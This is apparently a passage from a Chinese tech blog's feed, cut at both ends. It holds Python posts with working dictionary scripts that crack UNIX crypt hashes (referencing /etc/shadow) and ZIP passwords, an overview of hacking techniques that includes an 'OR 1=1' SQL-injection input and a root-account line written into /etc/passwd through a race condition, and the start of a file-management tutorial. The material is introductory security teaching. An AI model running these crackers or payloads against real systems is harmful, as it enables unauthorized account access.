        <content type="html"><![CDATA[<h3 id="1-进程内存映像"><a href="#1-进程内存映像" class="headerlink" title="1.进程内存映像"></a>1.进程内存映像</h3><ul><li>代码区：包含组成可执行文件的各种命令，保存着函数、控制语句、常数等，在进程创建时保存一次，直到进程销毁。代码区为只读区域，不可执行写入操作</li><li>数据与BSS区：保存着全局变量、静态常量、数组、结构体等。在进程创建时分配空间，进程运行时存入值。这两个区域都是可读写的<br>堆区：该区域是事先预约的空间，供进程运行时使用。程序员调用API可以分配任意大小内存。一般调用malloc()或calloc()函数进行分配，调用free()函数进行释放</li><li>栈区：程序自动使用的临时内存区域，用于保存局部变量的值，在函数调用时分配，函数退出时返还。堆与栈内存分配于相同空间。堆从低地址到高地址分配内存，栈从高地址向低地址分配内存，它们是系统黑客攻击的主要目标。在main()函数中，按照参数、返回地址、帧指针、局部变量顺序压入栈<br><img src="https://www.hualigs.cn/image/6050c8b9bf973.jpg" alt=""></li></ul><h3 id="2-应用程序"><a href="#2-应用程序" class="headerlink" title="2.应用程序"></a>2.应用程序</h3><ul><li>对使用编译型语言编写的程序，要采用黑盒方式探测漏洞进行黑客攻击。因为我们无法通过反编译方式得到程序源代码进行分析，只能通过输入不同值观察进程行为以进行黑客攻击</li><li>解释型语言程序，可以直接通过分析源代码寻找程序漏洞，这成为“白盒漏洞分析技术”</li></ul><h3 id="3-Web"><a href="#3-Web" class="headerlink" title="3.Web"></a>3.Web</h3><ul><li>寻找漏洞以获取系统root权限，或者发动黑客攻击盗取重要信息时，最常用的技术就是Web技术。虽然防火墙、IPS、IDS等可以组织来自外部的大部分攻击，但在安全规则中，向外提供Web服务器的80端口却常被作为一个例外进行处理<br><img src="https://www.hualigs.cn/image/6050c8b9b959c.jpg" alt=""></li></ul><h3 id="4-HTTP"><a href="#4-HTTP" class="headerlink" title="4.HTTP"></a>4.HTTP</h3><ul><li>HTTP请求协议由协议头与协议体组成，协议头含有方法类型、请求URL等服务处理所需的各种信息，而协议体则包含表单参数，与用户输入值对应</li><li>HTTP响应协议大致由状态码、内容类型、响应内容组成，其中状态码指示响应状态，内容类型指出传送的数据类型，响应内容是要展现给用户的结果<br><img src="https://www.hualigs.cn/image/6050c8b9b926e.jpg" alt=""></li></ul><h3 id="5-Cookie与会话"><a href="#5-Cookie与会话" class="headerlink" title="5.Cookie与会话"></a>5.Cookie与会话</h3><ul><li>浏览器保存数据的空间，称为Cookie</li><li>目前只将简单的控制信息、会话ID信息保存于此。由于Cookie信息包含于HTTP协议头信息，所以可将其用作在客户端与服务器之间传递信息的手段</li><li>会话是保存用户信息的Web服务器对象</li><li>用户登录Web后，用户信息就会保存在会话之中，然后通过Cookie将会话ID传递给浏览器。Web服务器会使用通过HTTP头传递的会话ID（位于Cookie）判断是否是认证用户</li></ul><p>基于会话的认证系统：</p><ul><li>（1）创建会话：创建用于保存用户认证信息的会话。创建的会话由Web服务器管理，保存在Web服务器进程占用的内存中</li><li>（2）传送会话ID：创建会话时，会同时创建用于标识会话的ID。为了判断相应客户端是否已经认证，在HTTP响应的Set-Cookie字段异同传送会话ID</li><li>（3）保存会话ID：浏览器从HTTP响应头提取会话ID并添加到Cookie</li><li>（4）传送会话ID：请求服务时，浏览器会将所有Cookie值放入HTTP请求头的Cookie字段、并进行传送，其中也包含会话ID</li><li>（5）识别会话：Web服务器分析HTTP头，从中提取会话ID。然后根据相应ID从自身会话列表提取相应值，进行认证</li></ul><p><strong>例1：一个UNIX密码破解器</strong></p><ul><li><p>需要用标准库中的crypt模块的crypt()函数。传入密码和盐即可。用crypt()函数哈希一个密码试试，输入密码”egg”和盐”HX”，返回的哈希值是”HX9LLTdc/jiDE”，现在可以遍历整个字典，试图用常用的盐来匹配破解哈希密码</p></li><li><p>哈希密码的前两位就是盐的前两位，这里假设盐只有两位<br><img src="https://www.hualigs.cn/image/6050c8b89f867.jpg" alt=""></p></li><li><p>程序分两部分，一部分是打开字典，另一部分是哈希匹配密码</p></li><li><p>UNIX/Linux系统将密码存储在/etc/shadow文件中，提供了更安全的哈希散列算法SHA-512算法，Python标准库中hashlib模块提供了此算法，可以更新代码，破解SHA-512哈希散列加密算法的密码</p></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=UTF-8</span><span class="token comment" spellcheck="true">#暴力破解UNIX的密码，需要输入字典文件和UNIX的密码文件</span><span class="token keyword">import</span> crypt<span class="token keyword">def</span> <span class="token function">testPass</span><span class="token punctuation">(</span>cryptPass<span class="token punctuation">)</span><span class="token punctuation">:</span>    salt<span class="token operator">=</span>cryptPass<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#前两个字符</span>    dictfile<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'dictionary.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#打开字典文件</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> dictfile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        word<span class="token operator">=</span>word<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#去行尾换行符，保留原始的字符，不去空格</span>        cryptWord<span class="token operator">=</span>crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>word<span class="token punctuation">,</span>salt<span class="token punctuation">)</span>        <span class="token keyword">if</span> cryptPass<span class="token operator">==</span>cryptWord<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Found Passed:'</span><span class="token punctuation">,</span>word<span class="token punctuation">)</span>            <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Password not found!'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    passfile<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'passwords.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取密码文件 open('r/etc/shadow','r')</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> passfile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user<span class="token operator">=</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#前第一项</span>        cryptPass<span class="token operator">=</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Cracking Password For:"</span><span class="token punctuation">,</span>user<span class="token punctuation">)</span>        testPass<span class="token punctuation">(</span>cryptPass<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>sqlmap模块（非标准库，sqlmap.org）提供了wordlist文件，解压后，得到的wordlist.txt（安转目录\data\txt\wordlist.tx_再解压）文件可以作为字典用于破解，包含大量常用密码超过120万个，10+MB</li></ul><p><strong>例2：ZIP文件密码破解</strong></p><ul><li>Python的标准库提供了ZIP文件的提取压缩模块zipfile，现在试用此模块暴力破解出加密的ZIP文件</li><li>可以用extractall()这个函数抽取文件，密码正确则返回正确，密码错误则抛出异常</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">extractFile</span><span class="token punctuation">(</span>zFile<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        zFile<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>password<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#extractall(pwd=password.encode('ascii'))</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Foune Passwd:"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>        <span class="token keyword">return</span> password    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    zFile<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'unzip.zip'</span><span class="token punctuation">)</span>    passFile<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'dictionary.txt'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> passFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        password<span class="token operator">=</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>extractFile<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>zFile<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token triple-quoted-string string">''' 单线    guess=extractFile(zFile,password)    if guess:        print('Password=',password)        return    else:        print("can't find password")        return    '''</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/16/2021 11:06:45 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>黑客攻击技术</title>
      <link href="2021/03/15/hei-ke-gong-ji-ji-zhu/"/>
      <url>2021/03/15/hei-ke-gong-ji-ji-zhu/</url>
      
        <content type="html"><![CDATA[<ul><li>系统攻击针对的是计算机内核，可以侵入计算机内核管理的内存、注册表等区域，非法获取其中数据或root权限</li><li>应用程序攻击是围绕用户运行的程序实施的攻击。通过向应用程序注入包含恶意代码的DLL或调试操作，拦截用户的键盘输入</li><li>Web攻击利用网络浏览器与Web服务器的结构漏洞实施黑客攻击，是目前常用的攻击技术</li><li>网络黑客攻击基于网络实施黑客攻击，包括常见的DoS攻击、网络包嗅探（Spoofing）等</li><li>此外，还有无线网络攻击与其他黑客攻击技术<br><img src="https://www.hualigs.cn/image/604f72e460616.jpg" alt=""></li></ul><h1 id="一、应用程序攻击"><a href="#一、应用程序攻击" class="headerlink" title="一、应用程序攻击"></a>一、应用程序攻击</h1><ul><li>计算机中有许多安全解决方案。比如键盘安全解决方案，对键盘输入与屏幕输出之间传送的数据进行加密。黑客攻击使用的键盘记录器也采用了类似原理，系统内核提供的消息钩取功能。键盘输入由系统内核进行感知，在中间拦截消息。</li><li>开发应用程序时，调试器是必需的工具。发生特定事件或调用API时，调试器会暂停正在执行的操作，转而运行其他功能或记录内存状态。黑客也可以使用它诱导系统运行恶意代码。</li></ul><h1 id="二、应用程序攻击技术"><a href="#二、应用程序攻击技术" class="headerlink" title="二、应用程序攻击技术"></a>二、应用程序攻击技术</h1><p><strong>1.消息钩取</strong></p><ul><li>使用user32.dll中的SetWindowsHookExA()</li><li>Windows通过钩链（HookChain，处理消息的一系列函数指针的列表）处理来自键盘、鼠标等设备的消息</li><li>可将特定处理进程的指针强行注册到钩链，这样消息到来时即可对其进行特定处理</li><li>键盘记录器是最具代表性的攻击技术，采用消息钩取方式，在中间窃取用户的键盘输入消息，然后将之发送给黑客</li></ul><p><strong>2.API钩取</strong></p><ul><li>API钩取技术利用了操作系统提供的调试进程</li><li>首先使用调试器，在应用程序特定的命令位置设置断点，注册特定方法以便执行</li><li>应用程序运行过程中，遇到断点就会执行之前注册的方法（回调方法），黑客只要在回调方法中植入攻击代码即可执行相应动作</li></ul><p><strong>3.DLL注入</strong></p><ul><li>将动态链接库DLL插入特定应用程序</li><li>使用注册表，具体做法是现在注册表特定位置输入指定DLL名称，应用程序调用user32.dll时，指定DLL就会被加载到内存</li><li>注册钩取函数，以便特定事件发生时加载指定DLL</li><li>为运行中的应用程序创建远程线程以插入DLL。Windows中，CreateRemoteThread()函数用于创建远程线程</li></ul><p><strong>4.代码注入</strong></p><ul><li>与采用线程方式的DLL注入技术类似，不同之处在于，它插入的不是DLL，而是可以直接运行的shellcode</li><li>代码注入的优点是不需要事先将DLL保存到系统特定位置，并且执行速度快，不易被察觉</li><li>不足之处在于，shellcode自身特点决定了无法向其插入复杂的黑客攻击代码</li></ul><h1 id="三、Web攻击"><a href="#三、Web攻击" class="headerlink" title="三、Web攻击"></a>三、Web攻击</h1><ul><li>Web系统一般由网络浏览器、Web服务器、数据库三部分组成</li><li>黑客会恶意使用Web系统提供的功能</li><li>利用文件上传功能，将Webshell文件与恶意代码上传到Web服务器，然后运行Web shell文件，获取上传文件所在位置，进而控制Web服务器</li><li>利用用户输入功能可以实施SQL注入攻击，通过输入非正常SQL查询语句获取Web服务器的错误信息，并对这些信息加以分析，进而实施攻击</li><li>利用文件下载功能，可以将恶意代码散布到网络上的多台PC。网络浏览器中运行的THML与脚本代码可以被恶意用于开展XSS（跨站脚本）攻击与CSS（层叠样式表）攻击</li></ul><h1 id="四、Web攻击技术"><a href="#四、Web攻击技术" class="headerlink" title="四、Web攻击技术"></a>四、Web攻击技术</h1><p><strong>1.XSS（Cross-Site Scripting）攻击技术</strong></p><ul><li>将恶意代码植入到提供给其它用户使用的页面中。比如HTML页面和客户端脚本</li><li>感染浏览页面的用户PC，从中盗取用户个人信息、控制企业数据、挂马等。恶意代码大多数是脚本（JavaScript——公认的新型“ShellCode”），它读取cookie，并将其发送到特定URL</li><li>增强浏览器安全性，应用Web防火墙等应对</li></ul><p><strong>2.CSRF（Cross Site Request Forgery，跨站请求伪造）</strong></p><ul><li>也被称为“One Click Attack”或者“Session Riding”，通常缩写为CSRF或者XSRF</li><li>XSS利用站点内的信任用户，而CSRF则通过伪装受信任用户的请求来利用受信任的网站，对Web服务器发动攻击</li><li>CSRF攻击往往不大流行，难以防范<br><img src="https://www.hualigs.cn/image/604f72e66f246.jpg" alt=""></li></ul><p><strong>3.网络钓鱼（Phishing）</strong></p><p>黑客通过精心设计与银行、证券公司类似的仿冒网站（欺诈性邮件），骗取受害人在这些网站输入的金融信息或个人敏感信息</p><p><strong>4.域欺骗（Pharming）攻击</strong></p><p>黑客首先入侵DNS服务器，修改正常的域名与IP对照表，将仿冒网站的IP地址发送给用户浏览器，从而将用户引导至精心设计的仿冒网站</p><p><strong>5.SQL注入</strong></p><ul><li>利用HTML input标签发动攻击，以常见的登录处理过程为例说明</li><li>黑客向用户ID与密码框中输入的是一些能够诱使数据库产生错误行为的值。比如将类似OR 1=1输入并提交，服务器接收并构造SQL语句查询数据库，验证通过</li><li>黑客通过反复输入非正常的SQL语句，分析数据库返回的数据，从而得到最适合对系统进行攻击的SQL语句</li></ul><p><strong>6.Web shell攻击</strong></p><ul><li>恶意利用了Web提供的文件上传功能</li><li>将用于远程操纵服务器的Webshell文件上传到Web服务器，然后找到上传文件所在位置，得到访问Web shell文件的URL地址</li><li>然后，通过该URL地址运行Web shell文件，获取可以控制操作系统的超级权限</li></ul><h1 id="四、网络攻击"><a href="#四、网络攻击" class="headerlink" title="四、网络攻击"></a>四、网络攻击</h1><p>TCP/IP本质上并不具有防范攻击的能力，在连接设置与通信过程中有很多问题</p><ul><li>客户端初次尝试连接服务器时会向服务器发送SYN包，服务器将为该连接分配缓冲资源——若客户端不断向服务器发送SYN包，则服务器就会不断分配通信缓冲，缓冲全部耗尽后，服务器瘫痪</li><li>正常的通信连接结束后，黑客可以伪装成客户机拦截通信会话。一般使用TCP头中的序列号对通信对方进行认证，第三方可以轻松得到该序列号，并伪装相应客户机</li><li>IP头中的源IP信息很容易伪造。将源IP伪造为攻击方系统的IP而非客户机PC的IP并向服务器发送SYN包，服务器就会将ACK包发送给攻击方系统，从而实现Dos攻击</li></ul><h1 id="五、网络黑客攻击技术"><a href="#五、网络黑客攻击技术" class="headerlink" title="五、网络黑客攻击技术"></a>五、网络黑客攻击技术</h1><p><strong>1.端口扫描</strong></p><ul><li>IP是识别站点的逻辑地址，端口是逻辑单位，服务器对外开放的端口中最具代表性的是80,443（HTTPS），21（FTP），22（SSH），23（Telnet），25/110（SMTP/POP3），161（SNMP）…<ul><li>公认端口（Well-known Ports）：从0到1023</li><li>注册端口（Registered Ports）：从1024到49151，松散地绑定于一些服务</li><li>动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535.理论上，不应为服务分配这些端口。实际上，机器通常从1024起分配动态端口，SUN的RPC端口从32768开始</li></ul></li><li>端口扫描是针对对外提供服务的服务器进行扫描，获取服务器对外开放的端口列表<ul><li>基于UDP的端口扫描通过UDP包扫描端口</li><li>基于TCP的端口扫描则通过SYN、FIN等多种包扫描端口，探测相应端口是否开放</li></ul></li></ul><p><strong>2.包嗅探</strong></p><ul><li>以太网的同一网络环境（使用同一路由器）中，数据包的传送是基于MAC地址进行的。一台PC向另一台PC传送数据时，会广播到同网段的所有PC</li><li>借助包嗅探技术，PC会接收并处理所有数据包。这样，同一网络中传播的所有数据可一目了然</li></ul><p><strong>3.会话劫持（Session Hijacking）攻击</strong></p><ul><li>大致分为HTTP会话劫持与TCP会话劫持两类。前者是指通过盗取保存服务认证信息的Cookie中的SessionID值进行黑客攻击，后者是指盗取TCP数据包信息</li><li>网络攻击中常见TCP会话劫持</li><li>TCP协议使用IP、Port、Sequence Number三个要素对通信对方进行认证 </li></ul><p>做法：</p><ul><li>先通过包嗅探获取认证信息，然后使用它在中间拦截客户机与服务器之间的通信</li><li>黑客暂时断开客户机与服务器之间的连接，将发送方IP修改为黑客PC的IP，重设与服务器的连接</li><li>在服务器看来，通信只是暂时发生了中断，然后再次成功连接，从而将黑客PC误认为客户机</li><li>客户机与黑客PC也采用类似方式设置连接。这样，客户机与服务器之间的所有通信都会经过黑客PC</li></ul><p><strong>4.欺骗（Spoofing）攻击</strong></p><ul><li>可以对DNS、IP、ARP(IP-&gt;MAC)进行欺骗攻击</li><li>ARP欺骗</li><li>PC内部有ARP缓存表，若在ARP缓存中查不到相应信息，则可以通过ARP协议获取指定IP对应的MAC</li><li>由于ARP协议在设计时未充分考虑安全问题，所以很容易受到攻击。只要使用ARP Reply包即可轻松操作对方的ARP缓存表</li><li>黑客将PC A与PC B对应的信息替换为自身PC的MAC地址后，所有通信都会经过黑客PC </li></ul><p><strong>5.DoS（Denial of Service）攻击</strong></p><ul><li>通过修改SYN数据包的发送方地址，或者不断发送SYN数据包，将大量IP数据包分割为更小的单位进行传送等，即可使系统服务陷入瘫痪</li><li>DoS攻击指通过发送大量的数据包使系统服务瘫痪 </li><li>使用少数几台PC发动DoS攻击使攻击目标系统服务瘫痪并非易事。黑客广泛散播病毒，将大量PC机变为僵尸PC（“肉鸡”），通过控制这些僵尸PC发送大量合法服务请求，以使目标主机服务瘫痪——DDoS</li><li>通过僵尸网络（Botnet）发动DDoS攻击仍然是非常有用的攻击手段。恶意代码可以通过电子邮件、公告栏、木马等多种方式进行传播</li><li>为了防范DDoS攻击，一般采用网络隔离，将业务网与互联网隔离，接入互联网的机器感染，影响范围也不会扩散到内网</li></ul><h1 id="六、系统攻击"><a href="#六、系统攻击" class="headerlink" title="六、系统攻击"></a>六、系统攻击</h1><p>利用计算机系统结构与功能漏洞非法盗取敏感信息，或者诱使计算机执行意想不到的功能。 </p><p><strong>1.Rootkit</strong></p><ul><li>获取目标主机的root权限，或者安装可以控制系统的后门</li><li>有用户模式、内核模式、引导模式三种类型</li><li>用户模式在应用程序级别工作，比较容易测出，对系统危害较低</li><li>内核模式下会向内核添加其它代码，或者直接用新代码替代原有代码。开发虽然有难度，但能够对系统造成致命损害</li><li>引导模式对MBR（Master Boot Record，主引导记录）、VBR（Volume Boot Record，卷引导记录）、引导扇区产生影响，能够对整个文件系统加密，或者使系统无法引导</li></ul><p><strong>2.后门</strong></p><p>后门是指可以远程控制用户PC的程序</p><p><strong>3.注册表攻击</strong></p><p>注册表是一种数据库，采用“键，值”的形式保存各种信息。可以通过接口CRUD（Create Read Update Delete）操作注册表，尝试初始化用户密码、修改防火墙设置、DLL注入等多种攻击</p><p><strong>4.缓冲区溢出攻击</strong></p><ul><li>通过向进程输入非正常数据，将黑客精心准备的数据保存到内存，并使之运行</li><li>进程运行时，相应的数据会进入其内存区域，如栈、堆以及寄存器。修改此类数据后，进程的处理顺序就会改变或者停止运行。黑客通过不断修改输入值，观察哪些数据会引发错误，以及在输入值的哪一部分植入shell code可以运行，最终编写攻击代码</li><li>缓冲区溢出攻击代码不是独立运行的程序，它是随视频、音乐、文档一起运行的程序文件</li><li>将含有错误代码的视频发布到网络，用户下载该视频后，在播放器中将视频文件打开的瞬间，其内部含有的shell code会使内存陷入异常，从而得以运行 </li></ul><p><strong>5.竞态条件攻击</strong></p><ul><li>竞态条件是指两个进程为了使用一种资源而彼此竞争的状况。多个进程同时写一个文件时，就需要相互竞争，以获得该文件的句柄。竞态条件攻击利用此过程中出现的安全漏洞发动攻击</li><li>最常用的方式是利用/etc/passwd文件的负号链接，etc/passwd文件保存着用户账户信息。首先，使用root权限获得用户输入，创建临时文件，查找用于处理逻辑的进程。黑客向该进程反复输入代表添加用户的值（hacker: :0:0:root:/root:/bin/ksh）。另一方面，运行程序，反复创建/etc/passwd文件的符号链接（与临时文件同名）。两个进程争夺文件句柄的过程中，进程会向符号文件链接保存用户输入。此时，hacker: :0:0:root:/root:/bin/ksh会被写入etc/passwd文件，最终黑客账户获得root权限</li></ul><h1 id="三、其他攻击技术"><a href="#三、其他攻击技术" class="headerlink" title="三、其他攻击技术"></a>三、其他攻击技术</h1><p><strong>1.无线局域网黑客攻击技术</strong></p><ul><li>通过无线AP使用WIFI，无线局域网认证合法用户，并采用WEP、WPA、WPA2等多种安全机制对传送的数据进行加密</li><li>WEP（Wired Equivalent Privacy，有线等效加密）RC4串流加密技术有缺陷</li><li>WPA（WiFi Protected Access WiFi保护接入） 提高了安全性，但最初认证过程中存在隐藏WPA密钥的漏洞。黑客能够强制终止认证的会话，诱导重新认证，从而轻松获取WPA密钥</li><li>WPA2使用AES-CCMP加密方法弥补WPA的缺点。虽然无法破解或盗取WPA2的加密密钥，但采用ARP欺骗方式可以窃取接入者的敏感信息。因此，需要使用WIPS（Wireless Intrusion Prevention System）等设备为无线局域网构建立体防御体系</li></ul><p><strong>2.密码攻击技术</strong></p><p>第三方不是合法的加密参与方，它通过非正常方法试图进行加密、解密，称为密码攻击</p><ul><li>密文单独攻击是指攻击者在只有密文的情形下找出明文与加密密钥，攻击难度最高</li><li>已知明文攻击是指攻击者在有密文与部分明文的情形下展开攻击</li><li>选择明文攻击是指攻击者在能够执行加密的状态下进行攻击</li><li>选择密文攻击是指攻击者在可以解密的状态下进行攻击</li><li>暴力破解攻击，使用所有可能的字符组合进行暴力破解。从事先定义的字典依次取值代入，以达到破解密码的目的</li></ul><p><strong>3.社会工程黑客攻击技术</strong></p><p>只能通过不断对雇员进行安全培训并提高其安全意识进行预防<br>3/15/2021 10:55:05 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python系统管理</title>
      <link href="2021/03/13/python-xi-tong-guan-li/"/>
      <url>2021/03/13/python-xi-tong-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="一、相关模块"><a href="#一、相关模块" class="headerlink" title="一、相关模块"></a>一、相关模块</h1><ul><li>os模块：与操作系统相关的函数</li><li>os.path模块：与路径相关的函数</li><li>glob模块：文件通配符操作</li><li>tempfile模块：创建临时目录和文件</li><li>shutil模块：与目录和文件操作相关的函数</li><li>subprocess模块：用于执行其他程序</li></ul><h1 id="二、目录、文件和磁盘的基本操作"><a href="#二、目录、文件和磁盘的基本操作" class="headerlink" title="二、目录、文件和磁盘的基本操作"></a>二、目录、文件和磁盘的基本操作</h1><p><strong>创建目录</strong></p><p>使用os模块中的mkdir函数，可以创建目录，语法形式如下：</p><ul><li>os.mkdir(path,mode=0o777)    #创建目录path</li><li>os.makedirs(path,mode=0o777)    #创建目录path，以及所有的path中包含的上级目录</li></ul><p>其中，path为指定目录。如果path已存在，则导致FileExistsError</p><p><strong>临时目录和文件的创建</strong></p><p>使用tempfile模块中的函数，可以创建临时目录和文件，语法形式如下：</p><ul><li>tempfile.mkdtemp(suffix=’’,prefix=’tmp’,dir=None)    #创建并返回临时目录</li><li>tempfile.mkstemp(suffix=’’,prefix=’tmp’,dir=None,text=False)    #创建并返回临时文件</li><li>tempfile.TemporaryDirectory(suffix=’’,prefix=’tmp’,dir=None)    #调用mkdtemp，创建临时目录</li><li>tempfile.TemporaryFile(mode=’w+b’,buffering=None,encoding=None,newline=None,suffix=’’,prefix=’tmp’,dir=None)    #调用mkstemp，创建临时文件</li><li>tempfile.tempdir    #设置临时目录对应的路径</li><li>tempfile.gettempdir()    #获取临时目录</li></ul><p><strong>切换当前工作目录</strong></p><p>使用os模块中的chdir函数，可以切换当前工作目录，语法形式如下：</p><p>os.chdir(path)    #切换当前工作目录为path</p><p>其中，path为指定文件。如果找不到path，则导致FileNotFoundError</p><p><strong>目录内容列表</strong></p><p>使用os模块中的listdir函数，可以显示一个目录中的文件/子目录列表，语法形式如下：</p><p>os.listdir(path=’.’)    # 返回指定目录path中的所有文件/子目录的列表</p><p>其中，path为指定目录，默认为当前目录：’.’。os.curdir也表示当前目录</p><p><strong>文件通配符和glob.glob函数</strong></p><p>使用glob模块中的glob函数，可以获取满足指定模式的文件/目录列表，语法形式如下：</p><p>glob.glob(pathname)    #返回满足指定模式pathname的文件/目录的列表</p><p>其中，pathname为目录/文件模式，可以包含通配符*（0或多个字符）和？（1个字符）</p><p><strong>遍历目录和os.walk函数</strong></p><p>使用os模块的walk函数，可以遍历指定的目录结构，语法形式如下：</p><p>os.walk(top,topdown=True,onerror=None,followlink=False)    #返回目录结构的迭代器</p><p>其中，top为起始目录；topdown若为False，则从下往上遍历。对于目录结构中的每一个目录，生成一个元组：（dirpath,dirnames,filenames），dirpath为目录，dirnames为其中包含的子目录列表，filenames为其中包含的文件列表。</p><p>使用os模块的join函数，可以将目录名和文件名连接成全限定路径，函数形式如下：</p><p>os.path.join(path1[,path2[, …]])</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#输出指定目录的目录结构</span><span class="token keyword">import</span> re<span class="token punctuation">,</span>os<span class="token punctuation">,</span>os<span class="token punctuation">.</span>path<span class="token keyword">def</span> <span class="token function">ls_py</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>dirname<span class="token punctuation">,</span>subdirs<span class="token punctuation">,</span>files<span class="token punctuation">)</span><span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token operator">+</span>dirname<span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> fname <span class="token keyword">in</span> files<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirname<span class="token punctuation">,</span>fname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    path1<span class="token operator">=</span>r<span class="token string">'c:\pyrhonpa\ch17'</span>    ls_py<span class="token punctuation">(</span>path1<span class="token punctuation">)</span></code></pre><p><strong>判断文件/目录是否存在</strong></p><p>使用os.path模块函数exists，可以判断文件/目录是否存在，语法形式如下：</p><p>os.path.exists(路径名)</p><p><strong>测试文件类型</strong></p><ul><li>os.path.isfile(path)    #路径path是否为文件类型</li><li>os.path.isdir(path)    #路径path是否为目录类型</li><li>os.path.islink(path)    #路径path是否为链接类型</li><li>os.path.ismount(path)    #路径path是否为装载点类型</li><li>os.path.isabs(path)    #路径path是否为绝对路径</li></ul><p><strong>文件的日期及大小</strong></p><p>使用os.path模块函数，可以获取文件和目录的其它属性，语法形式如下：</p><ul><li>os.path.getatime(path)    #返回上次访问时间</li><li>os.path.getmtime(path)    #返回上次修改时间</li><li>os.path.getctime(path)    #返回创建时间</li><li>os.path.getsize(path)    #返回指定路径path的大小</li></ul><p>其中，path为指定文件目录路径，默认为当前目录: ‘.’</p><p><strong>文件的删除</strong></p><p>使用os模块中的remove函数，可以删除指定文件，语法形式如下：</p><p>os.remove(path)    #删除指定文件path</p><p><strong>目录的删除</strong></p><p>使用os模块中的rmdir函数，可以删除指定目录，语法形式如下：</p><p>os.rmdir(path)    #删除指定目录path</p><p>使用shutil模块中的rmtree函数，可以删除指定目录及目录下的所有内容</p><p>shutil.rmtree(path)    #删除指定目录path</p><p><strong>文件和目录复制、重命名和移动</strong></p><p>使用shutil模块中的下列函数，可以复制文件和目录，语法形式如下：</p><ul><li>shutil.copy(src,dst)    